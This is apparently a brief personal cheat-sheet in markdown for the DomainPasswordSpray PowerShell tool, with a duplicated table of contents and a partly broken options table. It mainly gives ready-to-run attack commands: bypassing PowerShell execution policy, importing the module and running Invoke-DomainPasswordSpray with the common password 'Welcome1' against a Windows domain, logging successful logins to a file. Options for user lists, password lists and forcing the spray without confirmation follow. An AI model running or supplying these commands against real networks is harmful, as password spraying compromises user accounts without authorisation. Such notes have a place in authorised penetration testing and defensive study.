## Table of Contents

  - [Table of Contents](#Table\of\Contents)
    - [get start](#get\start)

## Table of Contents

    - [get start](#get\start)

#domainpasswordspray 

### get start



`powershell.exe -exec bypass`

`Import-Module DomainPasswordSpray.ps1`

```powershell-session
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

| options|  descriptions|
| -- | -- |
|UserList | - Optional UserList parameter. This will be generated automatically if not specified.
|Password| A single password that will be used to perform the password spray. |
|PasswordList|- A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
OutFile           - A file to output the results to.
|Domain|            - A domain to spray against.
Force             - Forces the spray to continue without prompting for confirmation.
